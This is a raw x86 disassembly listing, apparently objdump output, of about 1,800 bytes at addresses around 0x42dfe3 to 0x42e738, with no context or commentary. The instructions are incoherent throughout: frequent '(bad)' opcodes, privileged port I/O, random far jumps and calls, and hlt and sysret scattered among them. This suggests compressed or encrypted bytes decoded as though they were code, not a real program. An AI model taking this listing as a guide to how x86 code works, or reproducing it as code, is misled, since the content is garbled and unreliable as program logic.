  42dfe3:	xchg   BYTE PTR [eax],al
  42dfe5:	mov    ds:0xb30c471f,al
  42dfea:	dec    eax
  42dfeb:	or     eax,0xba2294ff
  42dff0:	movsx  edx,WORD PTR [edi-0x6]
  42dff4:	dec    DWORD PTR [ebx+0x1f]
  42dff7:	dec    edi
  42dff8:	adc    al,cl
  42dffa:	cwde   
  42dffb:	pop    ecx
  42dffc:	xor    ecx,DWORD PTR [ebp+0x1f]
  42dfff:	cld    
  42e000:	mov    bh,bh
  42e002:	and    DWORD PTR [ebp-0x75],0x88a1c900
  42e009:	push   esp
  42e00a:	pop    ds
  42e00b:	sar    BYTE PTR [esi],cl
  42e00d:	xor    esp,DWORD PTR [esi+0x21]
  42e010:	dec    esi
  42e011:	and    al,0xc7
  42e013:	push   ds
  42e014:	enter  0x9789,0xb9
  42e018:	popa   
  42e019:	mov    DWORD PTR [edi],edi
  42e01b:	mov    ecx,0x77b4e869
  42e020:	cld    
  42e021:	jmp    FWORD PTR [edx]
  42e023:	sub    bh,BYTE PTR [esi]
  42e025:	and    al,0x6f
  42e027:	in     eax,dx
  42e028:	mov    eax,DWORD PTR [edi+ebx*2-0x77]
  42e02c:	dec    ecx
  42e02d:	lea    eax,[edi-0x37179247]
  42e033:	mov    cl,bh
  42e035:	dec    DWORD PTR [esi-0x63]
  42e038:	ins    DWORD PTR es:[edi],dx
  42e039:	adc    DWORD PTR [eax],esi
  42e03b:	jmp    0x65830064
  42e040:	loope  0x42e064
  42e042:	fld    QWORD PTR cs:[eax]
  42e045:	mov    DWORD PTR [edi-0x47],ecx
  42e048:	adc    ebx,ebp
  42e04a:	jg     0x42e06a
  42e04c:	data16 and al,0xb3
  42e04f:	and    BYTE PTR [edi],bh
  42e051:	adc    al,0xc8
  42e053:	pop    esi
  42e054:	cmp    BYTE PTR [eax-0x71],dh
  42e057:	lods   al,BYTE PTR ds:[esi]
  42e058:	xchg   esp,eax
  42e059:	ror    DWORD PTR [ebx],0x11
  42e05c:	push   ds
  42e05d:	xchg   BYTE PTR [edx-0x50],ah
  42e060:	std    
  42e061:	jmp    DWORD PTR [eax+0x39]
  42e064:	cmp    DWORD PTR [esi+edi*2],esp
  42e067:	pop    ebp
  42e068:	cld    
  42e069:	jle    0x42e06b
  42e06b:	sub    esi,DWORD PTR [edi-0x7979b48a]
  42e071:	adc    eax,0xfdb27200
  42e076:	mov    WORD PTR [esi-0x6817de72],gs
  42e07c:	cmc    
  42e07d:	add    al,0x0
  42e07f:	mov    eax,0xc7f815b4
  42e084:	jb     0x42e083
  42e086:	cli    
  42e087:	xchg   esi,eax
  42e088:	mov    ds,WORD PTR [ecx]
  42e08a:	xchg   DWORD PTR [edi],esi
  42e08c:	sub    bl,BYTE PTR [ecx]
  42e08e:	and    al,0x3e
  42e090:	cmp    DWORD PTR [ecx],ebx
  42e092:	and    al,0xae
  42e094:	cmp    DWORD PTR [ecx],ebx
  42e096:	and    al,0x9a
  42e098:	sub    DWORD PTR [edx],edx
  42e09a:	and    al,0x96
  42e09c:	sub    DWORD PTR [edx],edx
  42e09e:	and    al,0x82
  42e0a0:	call   0xbf7a:0xb262c471
  42e0a7:	push   edi
  42e0a8:	test   al,0x72
  42e0aa:	dec    ebx
  42e0ab:	jle    0x42e0a7
  42e0ad:	pushf  
  42e0ae:	xor    ah,BYTE PTR [edx+esi*4-0x4d391703]
  42e0b5:	std    
  42e0b6:	(bad)  
  42e0b7:	jmp    0xeb9ec1aa
  42e0bc:	mul    al
  42e0be:	dec    edi
  42e0bf:	cmp    BYTE PTR [eax-0x41818c8a],dh
  42e0c5:	ja     0x42e13a
  42e0c7:	inc    esi
  42e0c8:	div    BYTE PTR [ecx+0x43]
  42e0cb:	ds mov esi,0x46005371
  42e0d1:	mov    WORD PTR es:[esi],cx
  42e0d5:	xchg   esi,eax
  42e0d6:	xor    DWORD PTR [ecx+0x300bd926],ecx
  42e0dc:	mov    dh,ch
  42e0de:	inc    esi
  42e0df:	xchg   BYTE PTR [eax+0xa],ch
  42e0e2:	gs aas 
  42e0e4:	shl    DWORD PTR ds:[edi-0x580a5e8a],0x33
  42e0ec:	out    0xc,eax
  42e0ee:	add    al,0x10
  42e0f0:	cmp    ah,BYTE PTR [ecx]
  42e0f2:	test   BYTE PTR [ebx],0x62
  42e0f5:	push   esi
  42e0f6:	daa    
  42e0f7:	jp     0x5222a4df
  42e0fd:	pop    ds
  42e0fe:	(bad)  
  42e0ff:	xor    ch,BYTE PTR [ecx]
  42e101:	and    eax,0xcd6ebcc
  42e106:	les    esi,FWORD PTR [ebx]
  42e108:	mov    dl,0x33
  42e10a:	repz jbe 0x42e0ae
  42e10d:	cmc    
  42e10e:	scas   eax,DWORD PTR es:[edi]
  42e10f:	xor    edi,edx
  42e111:	in     al,0xb8
  42e113:	add    esp,DWORD PTR [edx+0x55]
  42e116:	daa    
  42e117:	hlt    
  42e118:	loope  0x42e15a
  42e11a:	out    0x3,eax
  42e11c:	bound  edx,QWORD PTR [ebx+edx*2+0x28]
  42e120:	sahf   
  42e121:	xor    ebp,esp
  42e123:	nop
  42e124:	xchg   ecx,eax
  42e125:	cmc    
  42e126:	or     ebx,ebp
  42e128:	lds    eax,FWORD PTR [eax+0x9d881c5]
  42e12e:	ins    DWORD PTR es:[edi],dx
  42e12f:	enter  0xc181,0x17
  42e133:	xchg   ecx,eax
  42e134:	add    BYTE PTR [ecx],ah
  42e136:	cmc    
  42e137:	daa    
  42e138:	aam    0xee
  42e13a:	or     al,0xcc
  42e13c:	idiv   DWORD PTR [ebp+0x6203d5ec]
  42e142:	push   esi
  42e143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e144:	clc    
  42e145:	and    edx,0x1f76282b
  42e14b:	loop   0x42e121
  42e14d:	cwde   
  42e14e:	and    al,0xc4
  42e150:	sbb    ebx,edi
  42e152:	or     al,0x1
  42e154:	int    0xb1
  42e156:	packuswb mm3,mm5
  42e159:	rcr    BYTE PTR [ebx],cl
  42e15b:	and    eax,0xe8b791b1
  42e160:	sbb    DWORD PTR [esi-0x27],esp
  42e163:	test   BYTE PTR [ecx],ch
  42e165:	push   0xf
  42e167:	xchg   ch,dl
  42e169:	test   DWORD PTR ds:0x117dadf3,ecx
  42e16f:	add    BYTE PTR [ebp+0x42da5665],dh
  42e175:	gs dec esp
  42e177:	inc    esp
  42e178:	add    eax,0xbc540f4e
  42e17d:	sbb    cl,BYTE PTR [esi+0x4c]
  42e180:	lds    ecx,FWORD PTR [ecx]
  42e182:	mov    bh,0xd8
  42e184:	les    esp,FWORD PTR [ecx-0x27]
  42e187:	test   BYTE PTR [ecx],ch
  42e189:	sbb    dh,bl
  42e18b:	test   DWORD PTR [ebp+0x1efe253d],esp
  42e191:	repz sbb ah,BYTE PTR ds:0x54063181
  42e198:	add    DWORD PTR [eax],0x68
  42e19b:	dec    esp
  42e19c:	dec    esp
  42e19d:	or     eax,0xcbcb716
  42e1a2:	data16 fld DWORD PTR [ecx+ebp*4-0x537a2516]
  42e1aa:	dec    esp
  42e1ab:	rol    BYTE PTR [ebp-0x2497b29],cl
  42e1b1:	dec    esp
  42e1b2:	jp     0x42e1dd
  42e1b4:	mov    BYTE PTR [ebp+0x7a],al
  42e1b7:	stc    
  42e1b8:	test   DWORD PTR [esi],edi
  42e1ba:	push   esi
  42e1bb:	out    dx,al
  42e1bc:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1be:	sti    
  42e1bf:	jbe    0x42e164
  42e1c1:	sub    DWORD PTR [esi+0x1e],esp
  42e1c4:	gs int 0x65
  42e1c7:	fyl2xp1 
  42e1c9:	push   ebp
  42e1ca:	inc    ebp
  42e1cb:	push   ecx
  42e1cc:	add    BYTE PTR [eax],al
  42e1ce:	mov    ebx,edx
  42e1d0:	jns    0x42e236
  42e1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1d3:	xchg   esi,eax
  42e1d4:	stc    
  42e1d5:	inc    BYTE PTR [edi-0xa]
  42e1d8:	add    BYTE PTR [eax],0x8b
  42e1db:	fidivr DWORD PTR [ecx+0x64]
  42e1de:	addr16 mov ecx,edi
  42e1e1:	(bad)  
  42e1e2:	xchg   edi,eax
  42e1e3:	mul    BYTE PTR [ecx*4-0x17b70941]
  42e1ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1eb:	test   eax,0x1ac7fff7
  42e1f0:	outs   dx,BYTE PTR ds:[esi]
  42e1f1:	cmp    eax,0x74d9b8
  42e1f6:	add    eax,0xfb5581d1
  42e1fb:	cs cld 
  42e1fd:	xor    al,BYTE PTR [eax]
  42e1ff:	jns    0x42e25c
  42e201:	ins    DWORD PTR es:[edi],dx
  42e202:	and    al,0x2f
  42e204:	dec    edi
  42e205:	ds adc al,0x4c
  42e208:	mov    eax,ds:0xd1c38b6d
  42e20d:	dec    edx
  42e20e:	mov    esi,edi
  42e210:	cmc    
  42e211:	sub    al,0x33
  42e213:	cmp    eax,DWORD PTR [esp+eax*4-0x4575032e]
  42e21a:	push   eax
  42e21b:	ficomp DWORD PTR [edx-0x53]
  42e21e:	and    al,0x77
  42e220:	aad    0x0
  42e222:	add    BYTE PTR [esi-0x77],bh
  42e225:	sbb    eax,0x679e2354
  42e22a:	(bad)  
  42e22b:	lods   al,BYTE PTR ds:[esi]
  42e22c:	push   eax
  42e22d:	mov    ecx,0x454ec175
  42e232:	and    al,0x63
  42e234:	sub    eax,0x580d6e23
  42e239:	jp     0x42e201
  42e23b:	(bad)  
  42e23c:	push   esp
  42e23d:	test   DWORD PTR [eax],0xff7353ac
  42e243:	int3   
  42e244:	push   edi
  42e245:	call   0xfdf4445f
  42e24a:	(bad)  
  42e24b:	jmp    0x518303eb
  42e250:	jnp    0x42e225
  42e252:	mov    WORD PTR [esi],fs
  42e254:	xchg   esp,eax
  42e255:	sbb    eax,0x28ebd750
  42e25a:	sub    BYTE PTR [edx],dl
  42e25c:	fcom   DWORD PTR [ebx]
  42e25e:	add    BYTE PTR [edx-0x30],ah
  42e261:	ror    DWORD PTR [eax+0x38d40e00],1
  42e267:	ret    
  42e268:	push   ds
  42e269:	int3   
  42e26a:	xor    al,0x4
  42e26c:	bound  esi,QWORD PTR [edx-0x11900503]
  42e272:	adc    DWORD PTR [eax+0x62],eax
  42e275:	das    
  42e276:	jge    0x42e278
  42e278:	iret   
  42e279:	mov    ah,0x8c
  42e27b:	dec    ebx
  42e27c:	xchg   dl,dl
  42e27e:	mov    DWORD PTR [eax-0x2a],eax
  42e281:	mov    ch,0x92
  42e283:	add    BYTE PTR [edx-0x4e],ah
  42e286:	idiv   ebp
  42e288:	fdiv   st,st(7)
  42e28a:	jge    0x42e284
  42e28c:	sub    dh,BYTE PTR [ebx+0x2d65fffd]
  42e292:	inc    ebx
  42e293:	dec    DWORD PTR ds:0xd705ebb3
  42e299:	and    DWORD PTR ds:[eax],ebp
  42e29c:	(bad)  
  42e29f:	loopne 0x42e298
  42e2a1:	mov    bl,0x8a
  42e2a3:	inc    ebx
  42e2a4:	inc    esi
  42e2a5:	rcl    ah,cl
  42e2a7:	mov    WORD PTR [esi-0x10afdb32],ds
  42e2ad:	out    0x28,al
  42e2af:	sub    al,0xe9
  42e2b1:	xchg   BYTE PTR gs:[ebx-0x7a],bl
  42e2b5:	retf   0xcc6c
  42e2b8:	push   eax
  42e2b9:	add    BYTE PTR fs:[esi+0x737835b2],0x31
  42e2c1:	fldcw  WORD PTR [esi-0x29]
  42e2c4:	cmp    DWORD PTR [ebp-0x29ff2cc8],0x321fcc15
  42e2ce:	push   eax
  42e2cf:	cdq    
  42e2d0:	imul   ecx,ebx,0x45
  42e2d3:	out    0x3,eax
  42e2d5:	in     eax,0x8b
  42e2d7:	outs   dx,BYTE PTR ds:[esi]
  42e2d8:	pop    ebx
  42e2d9:	jge    0x42e2a4
  42e2db:	mov    dl,0x3
  42e2dd:	bound  ebx,QWORD PTR [eax+0x6e]
  42e2e0:	xor    cl,0xe2
  42e2e3:	push   ss
  42e2e4:	jp     0x42e2cc
  42e2e6:	adc    bl,0x26
  42e2e9:	fst    QWORD PTR ds:0xdddd180c
  42e2ef:	xchg   edi,eax
  42e2f0:	add    ecx,esi
  42e2f2:	ret    
  42e2f3:	inc    edx
  42e2f4:	aaa    
  42e2f5:	adc    bl,BYTE PTR [esp+edx*8-0x17e6aaed]
  42e2fc:	mov    WORD PTR [ecx-0x232c2c0b],ss
  42e302:	les    edx,FWORD PTR [ebp+0x6b]
  42e305:	push   ebx
  42e306:	les    ebx,FWORD PTR [edx]
  42e308:	and    BYTE PTR [ebx+0x34f516e0],0x50
  42e30f:	fwait
  42e310:	daa    
  42e311:	outs   dx,BYTE PTR ds:[esi]
  42e312:	push   eax
  42e313:	push   ss
  42e314:	imul   edi,edx,0xffffffda
  42e317:	out    0x3,eax
  42e319:	xlat   BYTE PTR ds:[ebx]
  42e31a:	adc    al,0xcc
  42e31c:	and    edx,DWORD PTR [edx+0x4227a34e]
  42e322:	or     DWORD PTR [ebp-0x28],esi
  42e325:	inc    ecx
  42e326:	in     eax,dx
  42e327:	outs   dx,BYTE PTR ds:[esi]
  42e328:	push   ecx
  42e329:	std    
  42e32a:	cld    
  42e32b:	push   ebp
  42e32c:	jle    0x42e32e
  42e32e:	fmul   DWORD PTR [edi-0x29]
  42e331:	mov    ebx,edx
  42e333:	and    eax,0xa2b53373
  42e338:	loop   0x42e33e
  42e33a:	dec    esi
  42e33b:	leave  
  42e33c:	add    BYTE PTR [edx+ebp*4-0x9],ah
  42e340:	cmp    BYTE PTR [ecx],bl
  42e342:	jmp    0x6674cbd5
  42e347:	fld    DWORD PTR [eax]
  42e349:	gs push ds
  42e34b:	sub    BYTE PTR [edx],cl
  42e34d:	pusha  
  42e34e:	(bad)  
  42e34f:	rol    DWORD PTR [edi-0x781eb5d3],cl
  42e355:	and    eax,0x1d87dd3a
  42e35a:	cmp    bl,BYTE PTR [ecx]
  42e35c:	mov    WORD PTR ds:0xe4e8e14a,fs
  42e362:	jb     0x42e305
  42e364:	stc    
  42e365:	jb     0x42e2f9
  42e367:	neg    DWORD PTR [eax]
  42e369:	push   ecx
  42e36a:	loopne 0x42e34d
  42e36c:	add    cl,ch
  42e36e:	call   0xca140881
  42e373:	and    DWORD PTR [ebx],edi
  42e375:	jmp    0x58f35db
  42e37a:	bound  esi,QWORD PTR [ecx-0x269e0890]
  42e380:	test   DWORD PTR [ebp-0x7116fe83],ebx
  42e386:	outs   dx,DWORD PTR ds:[esi]
  42e387:	fld    DWORD PTR [eax]
  42e389:	mov    esi,0x6255fe07
  42e38e:	mov    edi,ebp
  42e390:	mov    ebp,0xaee800b4
  42e395:	jge    0x42e3ac
  42e397:	sub    cl,BYTE PTR [esi+0x43]
  42e39a:	cmc    
  42e39b:	das    
  42e39c:	or     BYTE PTR [esi],ch
  42e39e:	not    BYTE PTR [eax+ecx*1]
  42e3a1:	xchg   al,bh
  42e3a3:	call   0x7e7becb5
  42e3a8:	je     0x42e414
  42e3aa:	fbld   TBYTE PTR [esi+edx*2-0x40]
  42e3ae:	out    0xe5,al
  42e3b0:	imul   eax,DWORD PTR [eax],0x435261e9
  42e3b6:	add    BYTE PTR [edi],cl
  42e3b8:	dec    esi
  42e3b9:	aas    
  42e3ba:	sub    BYTE PTR [eax-0x6f],dl
  42e3bd:	icebp  
  42e3be:	push   ecx
  42e3bf:	inc    edx
  42e3c0:	xchg   esp,eax
  42e3c1:	and    eax,0x8be57d89
  42e3c6:	inc    ebp
  42e3c7:	add    eax,DWORD PTR [edi-0x328974b0]
  42e3cd:	xchg   DWORD PTR [ebp-0xd],edi
  42e3d0:	cs ds jno 0x42e3b9
  42e3d4:	sbb    eax,DWORD PTR [ebx+0x707fed0]
  42e3da:	test   ah,bh
  42e3dc:	aad    0x0
  42e3de:	add    BYTE PTR [eax],al
  42e3e0:	xchg   ecx,eax
  42e3e1:	icebp  
  42e3e2:	lea    edx,[ebp-0x43]
  42e3e5:	bound  eax,QWORD PTR [ebx]
  42e3e7:	repnz les eax,FWORD PTR [edi+0x404d7f41]
  42e3ee:	or     dl,al
  42e3f0:	sub    ecx,0x8d1df689
  42e3f6:	push   ebp
  42e3f7:	add    BYTE PTR [edi-0x68827783],al
  42e3fd:	dec    ebp
  42e3fe:	inc    esp
  42e3ff:	hlt    
  42e400:	mov    ds:0x84fde0cc,eax
  42e405:	mov    al,0xfe
  42e407:	mov    esi,gs
  42e409:	or     eax,0x3638e859
  42e40e:	std    
  42e40f:	(bad)  
  42e410:	fmul   QWORD PTR [eax+0x44]
  42e413:	(bad)  
  42e415:	dec    eax
  42e416:	dec    esp
  42e417:	in     al,dx
  42e418:	jae    0x42e438
  42e41a:	sub    BYTE PTR [eax],al
  42e41c:	sti    
  42e41d:	push   ecx
  42e41e:	mov    ecx,0x8c836475
  42e423:	inc    ebp
  42e424:	inc    ebx
  42e425:	xchg   BYTE PTR [ebp+ecx*2+0x2edf2d17],cl
  42e42c:	sti    
  42e42d:	aad    0x84
  42e42f:	shl    BYTE PTR [edx-0x3],0x6b
  42e433:	gs push 0x278d1216
  42e439:	and    ch,dl
  42e43b:	push   edx
  42e43c:	(bad)
  42e43f:	call   0x40d191
  42e444:	loope  0x42e4b9
  42e446:	sbb    BYTE PTR [ebp+0x5119bca2],al
  42e44c:	cmp    BYTE PTR [ebx],bh
  42e44e:	mov    DWORD PTR [edx+edx*8-0x21],eax
  42e452:	out    0x9,al
  42e454:	out    0xf4,eax
  42e456:	pusha  
  42e457:	dec    edi
  42e458:	(bad)  
  42e45a:	jo     0x42e443
  42e45c:	add    BYTE PTR [edx-0x19000274],cl
  42e462:	outs   dx,DWORD PTR ds:[esi]
  42e463:	clc    
  42e464:	add    esi,DWORD PTR [edx+0x33fd68b0]
  42e46a:	lock fistp DWORD PTR [ecx-0x65]
  42e46e:	in     eax,dx
  42e46f:	or     BYTE PTR [eax],al
  42e471:	mov    cl,0x55
  42e473:	rcl    DWORD PTR [edx-0x38],cl
  42e476:	jmp    0x4832:0x1fb7ed2f
  42e47d:	lds    edi,FWORD PTR [esi]
  42e47f:	std    
  42e480:	xchg   BYTE PTR [eax],bh
  42e482:	cld    
  42e483:	push   ebp
  42e484:	cli    
  42e485:	dec    edi
  42e486:	(bad)  
  42e487:	adc    al,0x40
  42e489:	bound  ecx,QWORD PTR [ebx]
  42e48b:	jne    0x42e411
  42e48d:	sub    al,0x6f
  42e48f:	sub    eax,0xfd9262bd
  42e494:	jmp    FWORD PTR [edi-0x5e834cb]
  42e49a:	jb     0x42e4da
  42e49c:	inc    DWORD PTR ds:0x9727cb06
  42e4a2:	fcmovb st,st(3)
  42e4a4:	shl    BYTE PTR [edx-0x7e],0x88
  42e4a8:	inc    ebx
  42e4a9:	inc    esi
  42e4aa:	fcos   
  42e4ac:	xor    bh,dh
  42e4ae:	(bad)  
  42e4b0:	mov    cl,BYTE PTR [ebx-0x23]
  42e4b3:	pusha  
  42e4b4:	in     eax,dx
  42e4b5:	pop    ebp
  42e4b6:	bound  edi,QWORD PTR [ecx]
  42e4b8:	adc    bl,bl
  42e4ba:	aaa    
  42e4bb:	fmul   DWORD PTR [edx+0x1ceed4b]
  42e4c1:	add    ch,ah
  42e4c3:	mov    gs,WORD PTR [ebp+esi*2+0x31]
  42e4c7:	iret   
  42e4c8:	pop    esi
  42e4c9:	xlat   BYTE PTR ds:[ebx]
  42e4ca:	sub    ebp,0x815dcc6e
  42e4d0:	fdivr  DWORD PTR [ecx-0x68]
  42e4d3:	cwde   
  42e4d4:	pusha  
  42e4d5:	lds    ebp,FWORD PTR [ecx+0x5e]
  42e4d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4d9:	div    DWORD PTR [esi+ebp*1+0x1d]
  42e4dd:	(bad)  
  42e4de:	std    
  42e4df:	dec    ebp
  42e4e0:	mov    eax,ds:0x1d2d7dc1
  42e4e5:	jge    0x42e535
  42e4e7:	in     eax,0xd6
  42e4e9:	ret    
  42e4ea:	ins    DWORD PTR es:[edi],dx
  42e4eb:	popa   
  42e4ec:	test   eax,0xd399df07
  42e4f1:	pop    es
  42e4f2:	in     eax,0x9e
  42e4f4:	or     DWORD PTR ds:[ebx+0x2a6b1964],esi
  42e4fb:	inc    eax
  42e4fc:	inc    ecx
  42e4fd:	jl     0x42e573
  42e4ff:	cdq    
  42e500:	call   0x620b:0x26349edd
  42e507:	mov    al,fs:0x22d9e51b
  42e50d:	adc    esi,DWORD PTR [ebp-0x5e]
  42e510:	arpl   WORD PTR [ebx+0x68],ax
  42e513:	outs   dx,BYTE PTR ds:[esi]
  42e514:	sub    BYTE PTR [esi-0x77d9675e],cl
  42e51a:	call   0x6edd:0x41f702f1
  42e521:	add    ch,BYTE PTR [eax+ebx*4+0x5d009900]
  42e528:	enter  0x65c7,0xa1
  42e52c:	jecxz  0x42e4c1
  42e52e:	test   al,0xdb
  42e530:	sbb    dl,bh
  42e532:	stos   DWORD PTR es:[edi],eax
  42e533:	(bad)  
  42e534:	fld    DWORD PTR [ebp+0x74947620]
  42e53a:	add    eax,0x1aff6062
  42e53f:	dec    ecx
  42e540:	sub    BYTE PTR [ecx],cl
  42e542:	cli    
  42e543:	cs pop esp
  42e545:	shl    dh,0xd2
  42e548:	cwde   
  42e549:	mov    ebp,DWORD PTR [eax]
  42e54b:	sub    DWORD PTR [esi+0x4],edx
  42e54e:	jmp    0x9e5c0627
  42e553:	xchg   edx,eax
  42e554:	mov    ebx,0x275f6204
  42e559:	cli    
  42e55a:	cmp    DWORD PTR [edx-0x38],ebx
  42e55d:	(bad)  
  42e55e:	ins    DWORD PTR es:[edi],dx
  42e55f:	push   ds
  42e560:	jecxz  0x42e4f5
  42e562:	test   al,0xeb
  42e564:	sbb    dl,bh
  42e566:	stos   DWORD PTR es:[edi],eax
  42e567:	(bad)  
  42e568:	fld    DWORD PTR [ebp-0x9fb1e0]
  42e56e:	gs mov fs,edi
  42e571:	sub    eax,0x956e230
  42e576:	jl     0x42e517
  42e578:	gs aas 
  42e57a:	dec    esi
  42e57b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e57c:	pop    edi
  42e57d:	inc    edi
  42e57e:	loope  0x42e548
  42e580:	or     ah,BYTE PTR ds:0x4ed9ece5
  42e586:	ss push cs
  42e588:	jmp    0x42e5b7
  42e58a:	and    BYTE PTR [eax],al
  42e58c:	loop   0x42e5e4
  42e58e:	or     DWORD PTR [edi+ebx*4+0x65],edi
  42e592:	aas    
  42e593:	push   ds
  42e594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e595:	fiadd  DWORD PTR [eax]
  42e597:	bound  esp,QWORD PTR [edi]
  42e599:	out    dx,eax
  42e59a:	test   eax,ebp
  42e59c:	mov    BYTE PTR [esi],ah
  42e59e:	sbb    DWORD PTR [eax],eax
  42e5a0:	enter  0x7e25,0xc0
  42e5a4:	or     al,0x6a
  42e5a6:	ror    BYTE PTR [ebp+0x53bb13ca],0x80
  42e5ad:	mov    cl,0x1d
  42e5af:	or     BYTE PTR [esi],ah
  42e5b1:	stos   DWORD PTR es:[edi],eax
  42e5b2:	dec    esi
  42e5b3:	mov    esi,DWORD PTR [edx+0x2e8d1984]
  42e5b9:	in     eax,dx
  42e5ba:	bound  eax,QWORD PTR [eax]
  42e5bc:	add    al,0x9a
  42e5be:	stc    
  42e5bf:	pop    es
  42e5c0:	xlat   BYTE PTR ds:[ebx]
  42e5c1:	call   0x7781:0xe55e88f9
  42e5c8:	xchg   ebx,eax
  42e5c9:	stos   DWORD PTR es:[edi],eax
  42e5ca:	not    BYTE PTR ds:0x40eb27
  42e5d0:	xor    ebx,ebx
  42e5d2:	sub    al,bl
  42e5d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5d5:	fbstp  TBYTE PTR [eax]
  42e5d7:	pop    es
  42e5d8:	or     dh,dl
  42e5da:	add    eax,0x5ddf083
  42e5df:	xchg   esp,eax
  42e5e0:	mov    ebx,0x74891084
  42e5e5:	repnz push edi
  42e5e7:	test   eax,edx
  42e5e9:	popa   
  42e5ea:	std    
  42e5eb:	inc    esp
  42e5ec:	jns    0x42e5c8
  42e5ee:	add    BYTE PTR [eax],al
  42e5f0:	add    BYTE PTR [eax+ecx*2-0x47],ch
  42e5f4:	sysret 
  42e5f6:	sbb    eax,0x5a54677a
  42e5fb:	add    DWORD PTR [edi+0x3a],0x2e8957b3
  42e602:	ret    0x45bd
  42e605:	cmp    ecx,DWORD PTR [edi]
  42e607:	ret    
  42e608:	inc    edx
  42e609:	dec    ebx
  42e60a:	sbb    eax,DWORD PTR [ebp+0x34]
  42e60d:	inc    esi
  42e60e:	push   ds
  42e60f:	cmp    al,0x0
  42e611:	je     0x42e5ac
  42e613:	xor    DWORD PTR [edi],ebx
  42e615:	dec    edi
  42e616:	pushf  
  42e617:	stc    
  42e618:	(bad)  
  42e619:	bound  eax,QWORD PTR [ebp+0x31]
  42e61c:	cmp    DWORD PTR [esi],ebx
  42e61e:	inc    edx
  42e61f:	std    
  42e620:	ret    0x409f
  42e623:	ror    bl,cl
  42e625:	mov    al,ds:0x9e443e80
  42e62a:	inc    cx
  42e62c:	cmp    eax,0x47c0bf62
  42e631:	loop   0x42e67e
  42e633:	ret    0xe8ff
  42e636:	cmp    al,0xd1
  42e638:	push   esi
  42e639:	mov    al,ds:0x2385fd83
  42e63e:	fisttp WORD PTR [edx-0x85e1d31]
  42e644:	jae    0x42e6ad
  42e646:	add    BYTE PTR [ebx+0x16],bh
  42e649:	das    
  42e64a:	xchg   DWORD PTR [ecx],ebx
  42e64c:	xchg   edi,eax
  42e64d:	pop    esi
  42e64e:	stos   DWORD PTR es:[edi],eax
  42e64f:	test   DWORD PTR [eax+0x7d],eax
  42e652:	inc    ebx
  42e653:	mov    al,BYTE PTR [eax+0x0]
  42e656:	inc    ebp
  42e657:	or     dl,BYTE PTR [ebp+0x7f]
  42e65a:	sub    dh,0xf0
  42e65d:	add    al,0xe2
  42e65f:	imul   ebx,DWORD PTR [ebx],0x7da45f75
  42e665:	xchg   DWORD PTR [ebx],esp
  42e667:	lahf   
  42e668:	inc    esp
  42e669:	push   eax
  42e66a:	jne    0x42e5ff
  42e66c:	sbb    DWORD PTR [edi+ebx*8],ecx
  42e66f:	lock xor al,0xfb
  42e672:	out    dx,al
  42e673:	jecxz  0x42e67d
  42e675:	jg     0x42e69a
  42e677:	xchg   ebx,eax
  42e678:	outs   dx,BYTE PTR gs:[esi]
  42e67a:	mov    eax,0x2058fd82
  42e67f:	jnp    0x42e67e
  42e681:	dec    esi
  42e682:	scas   eax,DWORD PTR es:[edi]
  42e683:	je     0x42e611
  42e685:	call   0x704cba21
  42e68a:	push   eax
  42e68b:	inc    edx
  42e68c:	std    
  42e68d:	xchg   BYTE PTR [edx],cl
  42e68f:	or     ebp,DWORD PTR [ebp-0x2]
  42e692:	and    eax,0x69b9e7da
  42e697:	adc    al,0xa4
  42e699:	add    ecx,DWORD PTR [ebp-0x4f]
  42e69c:	xchg   ecx,eax
  42e69d:	es mov al,0x94
  42e6a0:	hlt    
  42e6a1:	(bad)  
  42e6a2:	push   edi
  42e6a3:	sbb    eax,ebp
  42e6a5:	mov    WORD PTR [esi-0x3b],gs
  42e6a8:	jp     0x42e669
  42e6aa:	cmc    
  42e6ab:	jl     0x42e64f
  42e6ad:	cmp    al,0x62
  42e6af:	fldenv [esi+0x1f]
  42e6b2:	ss adc al,0x2c
  42e6b5:	add    al,0x62
  42e6b7:	enter  0xd1a7,0x0
  42e6bb:	inc    ebx
  42e6bc:	cmp    BYTE PTR [ebx],cl
  42e6be:	stc    
  42e6bf:	and    ecx,ebx
  42e6c1:	retf   0x220e
  42e6c4:	out    0x27,eax
  42e6c6:	add    al,0xcb
  42e6c8:	ins    DWORD PTR es:[edi],dx
  42e6c9:	out    0x3,eax
  42e6cb:	bound  ebp,QWORD PTR [edx+ebx*1]
  42e6ce:	jns    0x42e726
  42e6d0:	and    eax,0xe3a5c3d6
  42e6d5:	pop    edx
  42e6d6:	ss inc esi
  42e6d8:	adc    al,0x24
  42e6da:	add    al,0x95
  42e6dc:	(bad)  
  42e6dd:	push   eax
  42e6de:	daa    
  42e6df:	or     DWORD PTR ds:0x818882e8,ebx
  42e6e5:	out    0x3,al
  42e6e7:	bound  ecx,QWORD PTR [ebx]
  42e6e9:	sub    DWORD PTR [esi+0x3e7dca5],edi
  42e6ef:	jp     0x42e71b
  42e6f1:	scas   al,BYTE PTR es:[edi]
  42e6f2:	add    esp,DWORD PTR [edx+0x5d]
  42e6f5:	daa    
  42e6f6:	out    dx,eax
  42e6f7:	mov    ebp,0x81fe92e4
  42e6fc:	adc    al,0xac
  42e6fe:	add    ecx,DWORD PTR [ecx]
  42e700:	and    esi,0x32606203
  42e706:	sub    al,0x25
  42e708:	shr    BYTE PTR [eax],0x86
  42e70b:	push   ecx
  42e70c:	loop   0x42e70e
  42e70e:	bound  esp,QWORD PTR [ebp+eax*8+0x79]
  42e712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e713:	popa   
  42e714:	and    ecx,DWORD PTR [ebp+ebp*8+0x11502420]
  42e71b:	ins    BYTE PTR es:[edi],dx
  42e71c:	int3   
  42e71d:	add    cl,ch
  42e71f:	add    ah,ah
  42e721:	xlat   BYTE PTR ds:[ebx]
  42e722:	adc    eax,0x79bfc0b9
  42e727:	lods   eax,DWORD PTR ds:[esi]
  42e728:	popa   
  42e729:	xchg   esp,eax
  42e72a:	mov    edi,0x14665a12
  42e72f:	mov    dh,0x79
  42e731:	out    0x36,al
  42e733:	jmp    0x5e034499
  42e738:	xchg   eax,esp
